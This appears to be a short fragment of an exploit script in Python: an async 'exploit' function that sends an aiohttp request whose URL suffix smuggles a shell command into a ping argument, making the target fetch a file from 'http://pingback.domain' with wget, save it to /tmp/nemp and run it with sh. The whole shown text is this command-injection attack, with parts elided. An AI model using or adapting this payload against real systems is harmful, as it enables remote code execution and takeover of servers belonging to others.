...
async def exploit(ip, timeout):
    ...
    async with aiohttp.ClientSession() as session:
        try:
            ...
            suffix = "cmd+%2Fc+ping&argument=127.0.0.1+%7C+`wget%20http://pingback.domain%20-O%20-%3E%20/tmp/nemp;sh%20/tmp/nemp`&async_output=ping1487856455258&isWindows=false"
